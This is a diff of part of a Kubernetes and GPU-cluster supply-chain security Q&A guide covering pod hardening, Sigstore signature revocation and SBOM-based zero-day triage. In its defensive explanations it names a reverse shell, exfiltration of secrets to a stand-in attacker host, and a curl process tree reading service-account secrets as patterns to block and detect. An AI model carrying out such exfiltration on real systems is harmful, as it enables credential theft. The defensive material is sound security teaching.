+1. `readOnlyRootFilesystem: true`, `allowPrivilegeEscalation: false` and `drop: ["ALL"]` mean the payload cannot modify `/usr`, `/lib` or Python `site-packages` to persist itself, and it cannot escalate privileges.
+2. A default-deny egress `NetworkPolicy` means that when the payload tries to open a reverse shell, or to POST stolen environment variables or weights to `https://attacker-c2.example.com`, the packet is dropped at the CNI `veth` or eBPF filter and logged in Hubble.
+3. Tetragon or Falco eBPF runtime detection spots the unusual process tree, such as `python3 -> /bin/sh -> curl`, or an unexpected file read, such as `/var/run/secrets/...`. It then fires a high-priority security alert. Tetragon can also kill the process synchronously, through a `TracingPolicy` with `Sigkill` enforcement.
 </details>
 
 <details>
 <summary>19. Since Sigstore `cosign` keyless signatures use short-lived 10-minute certificates that have already expired by the time the image runs in production, how do you "revoke" trust in a compromised build or leaked CI workflow?</summary>
 
-In keyless Sigstore, a signature remains valid forever as long as its Rekor transparency-log timestamp falls within the Fulcio certificate's 10-minute validity window. Therefore, if a CI run was compromised and signed a malicious image digest `sha256:bad123...`:
-1. **Block the specific compromised image digest(s)** immediately in your Kyverno / `policy-controller` admission deny-list and delete/quarantine the digest in your internal registry.
-2. **If a KMS/keypair signing key was leaked:** Rotate to a new KMS key version (`versions/2`), update admission policies to trust only `versions/2`, and re-sign current approved production digests.
-3. **If a keyless CI workflow was vulnerable before timestamp $T$:** Update the admission policy's `attestations.conditions` (or workflow path/tag pattern) to require provenance generated after the fix commit/timestamp.
+In keyless Sigstore, a signature stays valid as long as its Rekor transparency-log timestamp falls within the Fulcio certificate's 10-minute validity window. So if a CI run was compromised and signed a malicious image digest `sha256:bad123...`:
+1. Block the compromised digests at once. Add them to your Kyverno or policy-controller admission deny list, and delete or quarantine them in your internal registry.
+2. If a KMS or keypair signing key leaked, rotate to a new KMS key version, such as `versions/2`. Update admission policies to trust only `versions/2`, and re-sign the current approved production digests.
+3. If a keyless CI workflow was vulnerable before timestamp $T$, update the admission policy's `attestations.conditions`, or the workflow path or tag pattern, to require provenance generated after the fix commit or timestamp.
 </details>
 
 <details>
 <summary>20. During a "Log4Shell" or "xz"-style zero-day vulnerability disclosure, how do you identify every affected Pod across 10 GPU clusters in under 15 minutes?</summary>
 
-Instead of slow, ad-hoc node scanning across thousands of running containers:
-1. Query your **running image digest inventory** (`kubectl get pods -A -o jsonpath='{..imageID}'` or Prometheus `kube_pod_container_info`) to get the set of active `sha256:...` digests in every cluster.
-2. Query your central **SBOM inventory database (`Dependency-Track`, `GUAC`, or OCI Registry SPDX/CycloneDX attestations)** for any SBOM containing `package == "xz" && version in ["5.6.0", "5.6.1"]`.
-3. Intersect the two sets to produce an instant, exact list of `(cluster, namespace, deployment, pod, owner_team)` running the vulnerable library, create VEX/patch tickets, and trigger automated base-image rebuilds.
+Rather than scanning nodes ad hoc across thousands of running containers, work from inventory.
+1. Query your running image digest inventory, using `kubectl get pods -A -o jsonpath='{..imageID}'` or the Prometheus metric `kube_pod_container_info`. That gives the set of active `sha256:...` digests in every cluster.
+2. Query your central SBOM inventory database, such as Dependency-Track, GUAC, or the OCI registry's SPDX and CycloneDX attestations, for any SBOM that contains `package == "xz" && version in ["5.6.0", "5.6.1"]`.
+3. Intersect the two sets. That produces an exact list of `(cluster, namespace, deployment, pod, owner_team)` tuples that run the vulnerable library. From there, create VEX or patch tickets and trigger automated base-image rebuilds.
 </details>
 
 ## Sources and review notes
